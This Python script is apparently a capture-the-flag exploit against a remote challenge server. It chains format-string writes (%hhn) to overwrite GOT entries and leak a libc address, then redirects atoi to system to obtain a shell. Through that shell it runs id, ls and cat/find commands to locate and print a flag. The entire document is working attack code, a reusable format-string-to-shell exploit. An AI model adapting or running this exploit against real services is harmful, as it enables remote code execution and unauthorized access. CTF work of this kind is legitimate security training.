import sys, socket, time, struct, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
ATOI_GOT = 0x601058
READ_GOT = 0x601050
LOOP = 0x4008be
READ_OFF = 0x111130
SYSTEM_OFF = 0x52290


def build(fmt_body, addrs):
    a = b"-1" + fmt_body
    pad = (8 - (len(a) % 8)) % 8
    a += b"P" * pad
    names_off = len(a)
    for ad in addrs:
        a += struct.pack("<Q", ad)
    pos = [10 + (names_off // 8) + i for i in range(len(addrs))]
    return a, pos


def make_fmt(dst, value, leak_addr=None, c0=21, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    fmt = b""
    for i in range(len(order)):
        fmt += b"%99c%99$hhn"
    if leak_addr is not None:
        fmt += b"%99$s"
    a, pos = build(fmt, addrs)
    fmt = b""
    cur = c0
    for i, (v, off) in enumerate(order):
        need = (v - cur) % 256
        if need == 0:
            need = 256
        cur += need
        fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
    if leak_addr is not None:
        fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
    a2, pos2 = build(fmt, addrs)
    return a2, pos2


s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass

# --- passe 1 : loop-back + leak read ---
a1, _ = make_fmt(PRINTF_GOT, LOOP, READ_GOT, c0=21)
s.sendall(a1 + b"\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(1.0)
buf = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        buf += c
except Exception:
    pass
print("passe1 recu:", len(buf))
j = buf.find(b"PPPP")
leak = buf[j - 6:j]
read_addr = int.from_bytes(leak + b"\x00\x00", "little")
base = read_addr - READ_OFF
system = base + SYSTEM_OFF
print("leak read:", hex(read_addr), "base:", hex(base), "system:", hex(system))

# --- passe 2 : ecrire system dans atoi@got ---
a2, p2 = make_fmt(ATOI_GOT, system, None, c0=21)
print("passe2 fmt:", a2[:80], "pos:", p2)
s.sendall(a2 + b"\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(0.8)
try:
    s.recv(1 << 16)
except Exception:
    pass

# --- passe 3 : A = "sh" -> system("sh") ---
s.sendall(b"sh\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(1.2)
s.sendall(b"echo SHELL_OK; id; ls /app 2>/dev/null; cat flag.txt 2>/dev/null; cat /app/flag* 2>/dev/null; find / -name 'flag*' -maxdepth 3 2>/dev/null\n")
time.sleep(2.0)
out = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        out += c
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[-1500:])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("\nFLAG:", f.group(0) if f else "non trouve")
s.close()
